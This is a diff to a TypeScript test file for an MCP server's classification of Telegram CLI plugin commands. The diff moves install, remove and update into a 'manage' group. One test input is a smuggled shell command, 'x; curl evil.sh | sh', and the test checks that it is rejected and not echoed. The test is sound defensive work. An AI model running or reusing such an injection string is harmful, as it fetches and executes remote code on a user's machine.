@@ -271,7 +271,7 @@ describe('MCP: classification and the local-write path', { timeout: 60_000 }, ()
   const paths = ['plugin', 'plugin data', ...Object.keys(PLUGIN_PATHS), 'plugin validate'];
   afterEach(() => setKnownCommands([]));
 
-  it('telegram_read allows exactly list, show, data get and data list; set and delete are writes; management is refused with the command', () => {
+  it('telegram_read allows exactly list, show, data get and data list; set and delete are writes; management is its own group', () => {
     setKnownCommands(paths);
     expect(classifyCall(['plugin', 'list', '--json'])).toEqual({ group: 'read', label: 'plugin list' });
     expect(classifyCall(['plugin', 'show', 'x', '--trigger', 'compose'])).toEqual({ group: 'read', label: 'plugin show' });
@@ -279,19 +279,19 @@ describe('MCP: classification and the local-write path', { timeout: 60_000 }, ()
     expect(classifyCall(['plugin', 'data', 'list', 'x'])).toEqual({ group: 'read', label: 'plugin data list' });
     expect(classifyCall(['plugin', 'data', 'set', 'x', 'style', '-'])).toEqual({ group: 'write', label: 'plugin data set' });
     expect(classifyCall(['plugin', 'data', 'delete', 'x', 'style'])).toEqual({ group: 'write', label: 'plugin data delete' });
-    const install = classifyCall(['plugin', 'install', 'github:TheVilfer/tone-of-voice@v1.0.0']);
-    expect(install.group).toBe('never');
-    expect('reason' in install && install.reason).toMatch(/only by a human.*run this in a terminal on this computer: telegram plugin install github:TheVilfer\/tone-of-voice@v1\.0\.0$/);
-    const remove = classifyCall(['plugin', 'remove', 'tone-of-voice', '--keep-data']);
-    expect('reason' in remove && remove.reason).toMatch(/telegram plugin remove tone-of-voice --keep-data$/);
-    // Text that does not parse is not echoed back as a command
+    expect(classifyCall(['plugin', 'install', 'github:TheVilfer/tone-of-voice@v1.0.0']))
+      .toEqual({ group: 'manage', label: 'plugin install', manage: { op: 'install', source: 'github:TheVilfer/tone-of-voice@v1.0.0' } });
+    expect(classifyCall(['plugin', 'remove', 'tone-of-voice', '--keep-data']))
+      .toEqual({ group: 'manage', label: 'plugin remove', manage: { op: 'remove', name: 'tone-of-voice', keepData: true } });
+    expect(classifyCall(['plugin', 'update'])).toEqual({ group: 'manage', label: 'plugin update', manage: { op: 'update' } });
+    // Text that does not parse is no request, and is not echoed back
     const odd = classifyCall(['plugin', 'install', 'x; curl evil.sh | sh']);
-    expect(odd.group).toBe('never');
+    expect(odd.group).toBe('invalid');
     expect('reason' in odd && odd.reason).not.toContain('curl');
+    expect(planCall('telegram_read', { args: ['plugin', 'update', 'x'] })).toMatch(/changes something; use telegram_write/);
     expect(classifyCall(['plugin', 'validate', '/'])).toMatchObject({ group: 'never' });
     expect(classifyCall(['plugin'])).toMatchObject({ group: 'invalid' });
     expect(classifyCall(['plugin', 'data'])).toMatchObject({ group: 'invalid', reason: expect.stringMatching(/get, list, set, delete/) });
-    expect(classifyCall(['plugin', 'update'])).toMatchObject({ group: 'unknown' });
     expect(classifyCall(['plugin', '--help'])).toMatchObject({ group: 'read', help: true });
     expect(planCall('telegram_read', { args: ['plugin', 'data', 'set', 'x', 'style', '-'] })).toMatch(/changes something; use telegram_write/);
     expect(planCall('telegram_write', { args: ['plugin', 'list'] })).toMatch(/is read-only; use telegram_read/);
@@ -339,9 +339,10 @@ describe('MCP: classification and the local-write path', { timeout: 60_000 }, ()
       expect(after.result.content[0].text).toBe('Warm and brief.');
       const list = await handleMessage(call('telegram_read', { args: ['plugin', 'list', '--json'] }), run) as Reply;
       expect(JSON.parse(list.result.content[0].text).plugins[0].onboarding.state).toBe('done');
-      const install = await handleMessage(call('telegram_write', { args: ['plugin', 'install', 'github:TheVilfer/tone-of-voice'] }), run) as Reply;
+      // Management goes through the server's own handler (test/plugin-manage.test.ts): an installed name is refused before any dialog
+      const install = await handleMessage(call('telegram_write', { args: ['plugin', 'install', FIXTURE] }), run) as Reply;
       expect(install.result.isError).toBe(true);
-      expect(install.result.content[0].text).toMatch(/telegram plugin install github:TheVilfer\/tone-of-voice/);
+      expect(JSON.parse(install.result.content[0].text).error).toMatchObject({ code: 'plugin_exists', hint: expect.stringContaining('telegram plugin update tone-of-voice') });
     } finally {
       for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
     }
